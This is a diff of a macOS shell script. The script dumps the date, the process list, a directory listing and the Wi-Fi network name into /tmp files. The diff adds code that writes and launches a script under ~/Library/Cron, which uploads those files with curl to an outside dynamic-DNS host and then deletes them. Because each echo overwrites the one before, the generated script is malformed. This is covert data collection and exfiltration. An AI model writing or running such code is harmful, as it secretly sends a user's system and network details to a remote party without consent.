@@ -3,14 +3,19 @@
 echo $(date) > /tmp/screen_mac_date.txt
 ps -ef > /tmp/screen_mac_000_psef.txt
 
+
+echo 'find /tmp/ -name screen_mac* -type f -print | while read -r file ; do' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
+echo '  echo "uploading $file" ' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
+echo '  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break'  > /Users/Vladdy/Library/Cron/scrcap_kk.sh
+#  # sleep 1
+echo '  rm $file ' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
+echo 'done' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
+
+ps -ef | grep scrcap_kk || /Users/Vladdy/Library/Cron/scrcap_kk.sh
+
 sleep 2
 
-#find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
-#  echo "uploading $file"
-#  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
-#  # sleep 1
-#  rm $file 
-#done
+ls -la /Users/Vladdy/Library/Cron/ > /tmp/screen_mac_000_uvlc_lsla.txt
 
 networksetup -getairportnetwork en0 > /tmp/screen_mac_000_get_airport_net.txt || true
 
